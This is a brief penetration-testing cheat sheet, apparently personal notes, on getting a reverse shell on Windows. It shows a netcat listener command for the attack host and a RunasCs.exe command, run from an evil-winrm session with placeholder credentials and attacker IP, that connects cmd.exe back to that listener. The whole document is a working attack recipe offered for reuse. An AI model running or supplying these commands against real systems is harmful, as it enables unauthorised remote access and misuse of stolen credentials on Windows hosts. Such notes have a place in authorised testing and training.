# Windows Misc Commands

## Rev Shell from evil-winrm using RunasCs.exe
* Attack Host
```bash
nc -lvnp 1337
```
* Evil-WinRM
```cmd
.\RunasCs.exe <user> <password> cmd.exe -r <yourip>:1337
```
